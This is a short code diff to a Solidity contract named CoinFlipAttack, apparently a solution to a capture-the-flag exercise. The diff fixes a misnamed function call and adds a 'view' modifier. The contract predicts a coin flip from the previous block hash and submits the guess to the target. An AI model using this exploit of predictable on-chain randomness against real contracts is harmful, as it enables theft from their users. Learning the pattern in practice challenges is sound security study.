@@ -44,13 +44,13 @@ contract CoinFlipAttack {
         coinFlip = CoinFlip(_coinFlipAddress);
     }
 
-    function preCalculateFlip() private returns (bool) {
+    function preCalculateFlip() private view returns (bool) {
         uint256 blockValue = uint256(blockhash(block.number - 1));
         return ( blockValue / FACTOR ) == 1 ? true : false;
     }
 
     function attackCoinFlip() public {
-        preCalculatedFlip = preCalculatedFlip();
+        preCalculatedFlip = preCalculateFlip();
         coinFlip.flip(preCalculatedFlip);
     }
 }
